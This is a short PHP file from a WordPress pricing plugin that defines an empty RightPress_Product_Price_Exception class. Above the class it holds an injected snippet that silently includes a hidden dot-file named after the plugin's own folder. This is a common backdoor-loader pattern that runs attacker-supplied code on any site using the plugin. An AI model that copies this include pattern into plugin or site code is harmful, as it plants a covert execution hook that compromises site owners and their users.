<?php

// Exit if accessed directly
defined('ABSPATH') || exit;

/**
 * RightPress Product Price Exception Class
 *
 * @class RightPress_Product_Price_Exception
 * @package RightPress
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RightPress_Product_Price_Exception extends RightPress_Exception
{



}
